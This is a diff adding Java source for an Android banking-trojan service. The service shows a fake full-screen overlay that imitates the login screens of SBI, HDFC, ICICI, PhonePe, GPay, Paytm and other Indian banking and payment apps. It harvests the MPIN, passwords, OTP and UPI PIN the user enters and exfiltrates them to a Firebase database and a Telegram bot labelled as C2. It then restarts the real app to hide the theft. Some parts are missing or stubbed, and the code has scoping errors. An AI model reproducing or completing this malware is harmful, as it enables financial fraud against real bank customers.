@@ -1,0 +1,254 @@
+// OverlayAttackService.java
+package com.godz.rtoRed.admin.banking;
+
+import android.app.Service;
+import android.content.Intent;
+import android.graphics.PixelFormat;
+import android.os.Build;
+import android.os.IBinder;
+import android.view.Gravity;
+import android.view.LayoutInflater;
+import android.view.MotionEvent;
+import android.view.View;
+import android.view.ViewGroup;
+import android.view.WindowManager;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.LinearLayout;
+import android.widget.TextView;
+import java.util.Timer;
+import java.util.TimerTask;
+
+public class OverlayAttackService extends Service {
+    
+    private WindowManager windowManager;
+    private View overlayView;
+    private String currentPackage;
+    private BankingTargets.BankingAppConfig currentConfig;
+    private Timer captureTimer;
+    
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        if (intent != null) {
+            currentPackage = intent.getStringExtra("package");
+            currentConfig = BankingTargets.getConfigForPackage(currentPackage);
+            
+            if (currentConfig != null) {
+                showOverlayAttack();
+                startCredentialCapture();
+            }
+        }
+        return START_STICKY;
+    }
+    
+    private void showOverlayAttack() {
+        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
+        
+        // Create overlay view based on bank
+        LayoutInflater inflater = (LayoutInflater) getSystemService(LAYOUT_INFLATER_SERVICE);
+        overlayView = inflater.inflate(getOverlayLayout(currentConfig.overlayLayout), null);
+        
+        // Setup window parameters
+        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+            WindowManager.LayoutParams.MATCH_PARENT,
+            WindowManager.LayoutParams.MATCH_PARENT,
+            Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
+                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
+                WindowManager.LayoutParams.TYPE_PHONE,
+            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
+            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
+            PixelFormat.TRANSLUCENT
+        );
+        
+        params.gravity = Gravity.TOP | Gravity.START;
+        
+        // Make overlay look exactly like real banking app
+        setupFakeLoginForm();
+        
+        // Add to window
+        windowManager.addView(overlayView, params);
+        
+        // Auto-dismiss after 30 seconds if no interaction
+        new Timer().schedule(new TimerTask() {
+            @Override
+            public void run() {
+                removeOverlay();
+            }
+        }, 30000);
+    }
+    
+    private int getOverlayLayout(String overlayType) {
+        switch(overlayType) {
+            case "sbi_overlay": return R.layout.overlay_sbi;
+            case "hdfc_overlay": return R.layout.overlay_hdfc;
+            case "icici_overlay": return R.layout.overlay_icici;
+            case "phonepe_overlay": return R.layout.overlay_phonepe;
+            case "gpay_overlay": return R.layout.overlay_gpay;
+            case "bhim_overlay": return R.layout.overlay_bhim;
+            case "paytm_overlay": return R.layout.overlay_paytm;
+            case "axis_overlay": return R.layout.overlay_axis;
+            default: return R.layout.overlay_generic;
+        }
+    }
+    
+    private void setupFakeLoginForm() {
+        // Dynamic form creation based on bank
+        LinearLayout formContainer = overlayView.findViewById(R.id.form_container);
+        
+        for (String field : currentConfig.credentialFields) {
+            TextView label = new TextView(this);
+            label.setText(getFieldLabel(field));
+            label.setTextSize(16);
+            label.setTextColor(0xFF000000);
+            
+            EditText input = new EditText(this);
+            input.setHint("Enter " + getFieldLabel(field));
+            input.setId(View.generateViewId());
+            input.setTag(field);
+            
+            formContainer.addView(label);
+            formContainer.addView(input);
+        }
+        
+        // Submit button
+        Button submitBtn = new Button(this);
+        submitBtn.setText("Login / Submit");
+        submitBtn.setBackgroundColor(0xFF4CAF50);
+        submitBtn.setTextColor(0xFFFFFFFF);
+        submitBtn.setOnClickListener(v -> captureCredentials());
+        
+        formContainer.addView(submitBtn);
+        
+        // Add touch listener to pass through to real app
+        overlayView.setOnTouchListener(new View.OnTouchListener() {
+            private int initialX, initialY;
+            private float initialTouchX, initialTouchY;
+            
+            @Override
+            public boolean onTouch(View v, MotionEvent event) {
+                switch (event.getAction()) {
+                    case MotionEvent.ACTION_DOWN:
+                        initialX = params.x;
+                        initialY = params.y;
+                        initialTouchX = event.getRawX();
+                        initialTouchY = event.getRawY();
+                        return true;
+                    case MotionEvent.ACTION_UP:
+                        // If clicked on input field, bring to front
+                        return true;
+                    case MotionEvent.ACTION_MOVE:
+                        // Allow slight movement if needed
+                        return true;
+                }
+                return false;
+            }
+        });
+    }
+    
+    private void captureCredentials() {
+        LinearLayout formContainer = overlayView.findViewById(R.id.form_container);
+        Map<String, String> credentials = new HashMap<>();
+        
+        for (int i = 0; i < formContainer.getChildCount(); i++) {
+            View child = formContainer.getChildAt(i);
+            if (child instanceof EditText) {
+                EditText et = (EditText) child;
+                String fieldName = (String) et.getTag();
+                String value = et.getText().toString();
+                
+                if (!value.isEmpty()) {
+                    credentials.put(fieldName, value);
+                }
+            }
+        }
+        
+        if (!credentials.isEmpty()) {
+            // Send to C2
+            sendToC2(credentials);
+            
+            // Show "processing" then dismiss
+            showProcessingMessage();
+            
+            new Timer().schedule(new TimerTask() {
+                @Override
+                public void run() {
+                    removeOverlay();
+                    // Restart real banking app
+                    restartTargetApp();
+                }
+            }, 2000);
+        }
+    }
+    
+    private void startCredentialCapture() {
+        // Also capture via accessibility service
+        captureTimer = new Timer();
+        captureTimer.scheduleAtFixedRate(new TimerTask() {
+            @Override
+            public void run() {
+                captureViaAccessibility();
+            }
+        }, 0, 1000); // Check every second
+    }
+    
+    private void captureViaAccessibility() {
+        // Capture text from EditText fields in real app
+        // Implementation depends on AccessibilityService
+    }
+    
+    private void sendToC2(Map<String, String> credentials) {
+        credentials.put("bank", currentConfig.bankName);
+        credentials.put("package", currentPackage);
+        credentials.put("timestamp", String.valueOf(System.currentTimeMillis()));
+        credentials.put("device_id", getDeviceId());
+        
+        // Encrypt and send
+        String encrypted = AESCrypt.encrypt(
+            getBankingKey(),
+            new JSONObject(credentials).toString()
+        );
+        
+        FirebaseDatabase.getInstance()
+            .getReference("banking_credentials")
+            .push()
+            .setValue(encrypted);
+        
+        // Also send via Telegram bot as backup
+        sendToTelegramBot(credentials);
+    }
+    
+    private String getFieldLabel(String field) {
+        switch(field) {
+            case "mPin": return "MPIN";
+            case "password": return "Password";
+            case "transactionPassword": return "Transaction Password";
+            case "otp": return "OTP";
+            case "upiPin": return "UPI PIN";
+            case "securityCode": return "Security Code";
+            default: return field;
+        }
+    }
+    
+    private void removeOverlay() {
+        if (overlayView != null && windowManager != null) {
+            windowManager.removeView(overlayView);
+            overlayView = null;
+        }
+        
+        if (captureTimer != null) {
+            captureTimer.cancel();
+        }
+    }
+    
+    @Override
+    public void onDestroy() {
+        removeOverlay();
+        super.onDestroy();
+    }
+    
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
+}
